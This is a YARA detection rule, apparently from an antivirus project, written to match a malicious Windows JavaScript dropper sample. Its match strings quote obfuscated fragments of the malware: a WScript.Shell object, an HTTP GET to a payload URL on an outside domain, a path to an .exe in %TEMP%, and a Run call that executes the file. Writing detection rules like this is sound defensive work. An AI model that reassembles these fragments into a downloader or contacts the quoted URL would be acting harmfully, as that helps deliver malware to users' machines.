rule sig_20160328_cb8aabf268dd84f9b79a2c640fced2d8 {
  meta:
    description = "datamaliciousorder - file 20160328_cb8aabf268dd84f9b79a2c640fced2d8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "30f88529d86f22491633d21ae35e185b69cda46ece616c1ed0d50646c64a2a5c"

  strings:
    $s1  = "function Velxvxm() {return Hyutfsv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"dRlCInRQV9.exe\";};" fullword ascii
    $s2  = "do {WScript[Odwrzncxcm](Joelzwyiv() * 11)} while (Pyhregb[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Xvgbcilvdn(Rodgfvssw, Tjtairtl){return Rodgfvssw - Tjtairtl;};" fullword ascii
    $s4  = "var Hyutfsv = function Kyqsj() {return WScript[Yittptclrl](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Pyhregb[Urjny](\"GET\", \"http://perfect-nutrition.co.uk/lwqo9oa\", false);" fullword ascii
    $s6  = "function Xxjrfatkh() {return ((Ektfmfhoyt == true) && (Ektfmfhoyt == Ltyie)) ? 1 : Ypscrn;};" fullword ascii
    $s7  = "function Bhxmf(Zymzkctsgo){Hyutfsv[\"Run\"](Zymzkctsgo, Ypscrn, Ypscrn);};" fullword ascii
    $s8  = "function Faiip(){return Oclrv;};" fullword ascii
    $s9  = "return Xvgbcilvdn(Skyxnawkky, Oaahkmz);" fullword ascii
    $s10 = "Ltyie = true; " fullword ascii
    $s11 = "function Cxzazgg(){return Yittptclrl;};" fullword ascii
    $s12 = "var Ltyie = false;" fullword ascii
    $s13 = " while (Rznihoxn){" fullword ascii
    $s14 = "Ektfmfhoyt = true; " fullword ascii
    $s15 = "function Vulan(Qjpykb) {var Uzihggt = (1, 2, 3, 4, 5, Qjpykb); return Uzihggt;};" fullword ascii
    $s16 = "var Ektfmfhoyt = false;" fullword ascii
    $s17 = "function Oxcnirweoj()" fullword ascii
    $s18 = "var Ordkbm = new this[\"Date\"]();" fullword ascii
    $s19 = "function Joelzwyiv(){return 22;};" fullword ascii
    $s20 = "var Buswaxr = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}